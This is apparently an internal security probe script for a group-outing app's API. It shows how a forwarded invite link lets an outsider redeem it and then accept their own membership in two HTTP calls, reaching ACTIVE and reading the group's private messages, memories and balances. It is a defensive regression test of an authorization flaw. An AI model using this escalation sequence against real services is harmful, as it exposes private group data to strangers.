"""A forwarded outing invite link walks itself up to ACTIVE and reads the group.

rd-be-08 (#116) states the privacy hinge in its own docstring:

    "A link can be forwarded to anybody, so INVITED is the ceiling created
     here. Because `is_member` requires ACTIVE, the holder cannot read group
     messages, memories, or balances until a human accepts them through the
     existing `/memberships/{id}/accept` route."

Both halves are true in isolation. The sentence is still wrong, because of who
that "human" is allowed to be. `accept_context_membership` proves exactly one
predicate -- `is_invitee`, computed as `membership.person_id == actor.id`. The
invitee IS the accepter. Nobody in the group is consulted.

So the ceiling is not INVITED. It is ACTIVE, two HTTP calls away, and the first
call hands back the `membership_id` the second one needs.

This probe walks it as an outsider who was never named by anyone in the group:
they hold a link somebody forwarded, and nothing else.

Usage:
    MOBILE_API=http://localhost:8811 python3 forward_link_to_active.py
"""

from __future__ import annotations

import os
import sys
import uuid

import httpx

API = os.environ.get("MOBILE_API", "http://localhost:8811")
SECRET_CAPTION = "Anh rieng cua nhom -- khong ai ngoai nhom duoc thay"
SECRET_MESSAGE = "Tin nhan rieng cua nhom QA11"


def headers(person_id: str) -> dict[str, str]:
    return {"X-Actor-ID": person_id, "X-Actor-Roles": "member"}


def make_person(client: httpx.Client, name: str) -> str:
    person_id = str(uuid.uuid4())
    client.put(
        f"/people/{person_id}", json={"display_name": name}, headers=headers(person_id)
    ).raise_for_status()
    return person_id


def main() -> int:
    failures: list[str] = []
    with httpx.Client(base_url=API, timeout=30.0) as client:
        owner = make_person(client, "Chu nhom")
        outsider = make_person(client, "Nguoi ngoai chua ai moi")

        context_id = client.post(
            "/contexts", json={"display_name": "Team QA11 rieng tu"}, headers=headers(owner)
        ).json()["id"]

        # The group puts private things behind the membership wall.
        client.post(
            f"/contexts/{context_id}/memories",
            json={"image_url": "https://example.invalid/anh.jpg", "caption": SECRET_CAPTION},
            headers=headers(owner),
        ).raise_for_status()
        client.post(
            f"/contexts/{context_id}/messages",
            json={"kind": "text", "body": SECRET_MESSAGE},
            headers=headers(owner),
        ).raise_for_status()

        outing_id = client.post(
            f"/contexts/{context_id}/outings",
            json={
                "title": "Da Lat 2 ngay",
                "starts_on": "2026-09-05",
                "ends_on": "2026-09-06",
                "headcount": 4,
                "budget_per_person_vnd": 2_500_000,
            },
            headers=headers(owner),
        ).json()["id"]

        print("== truoc khi doi link ==")
        for path in ("memories", "messages", "balances"):
            code = client.get(f"/contexts/{context_id}/{path}", headers=headers(outsider)).status_code
            print(f"  GET /contexts/../{path:<9} -> {code}")
            if code != 403:
                failures.append(f"{path} khong phai 403 truoc khi doi link (nhan {code})")

        # A member mints a link. It is a bearer secret and forwardable by design;
        # the outsider receives it from a group chat they were never part of.
        token = client.post(
            f"/outings/{outing_id}/invites", json={"source": "link"}, headers=headers(owner)
        ).json()["invite_token"]

        # Step 1 -- redeem. Documented ceiling: INVITED.
        redeemed = client.post(
            f"/outing-invites/{token}/accept", headers=headers(outsider)
        )
        redeemed.raise_for_status()
        membership_id = redeemed.json()["membership_id"]
        state_after_redeem = redeemed.json()["membership_state"]
        print(f"\n== buoc 1: doi link -> state={state_after_redeem} ==")
        print(f"  phan hoi tra ve luon membership_id = {membership_id}")

        # Step 2 -- accept themselves. `is_invitee` is true: they are that person.
        promoted = client.post(
            f"/memberships/{membership_id}/accept", headers=headers(outsider)
        )
        print(f"\n== buoc 2: tu bam accept -> HTTP {promoted.status_code} ==")
        if promoted.status_code == 200:
            print(f"  state={promoted.json()['state']}")

        print("\n== sau khi tu accept ==")
        opened: list[str] = []
        for path in ("memories", "messages", "balances"):
            response = client.get(f"/contexts/{context_id}/{path}", headers=headers(outsider))
            print(f"  GET /contexts/../{path:<9} -> {response.status_code}")
            if response.status_code == 200:
                opened.append(path)

        leaked = []
        wall = client.get(f"/contexts/{context_id}/memories", headers=headers(outsider))
        if wall.status_code == 200 and SECRET_CAPTION in wall.text:
            leaked.append("caption tuong ky niem")
        chat = client.get(f"/contexts/{context_id}/messages", headers=headers(outsider))
        if chat.status_code == 200 and SECRET_MESSAGE in chat.text:
            leaked.append("noi dung tin nhan nhom")

        print()
        if opened:
            print(f"KET LUAN: nguoi ngoai doc duoc {', '.join(opened)}.")
            if leaked:
                print(f"  Doc duoc ca noi dung that: {', '.join(leaked)}.")
            print("  Khong mot thanh vien nao trong nhom bam dong y cho nguoi nay.")
            return 1
        if failures:
            print("KHONG KET LUAN DUOC: " + "; ".join(failures))
            return 2
        print("KET LUAN: tran INVITED giu duoc, nguoi ngoai van bi 403.")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
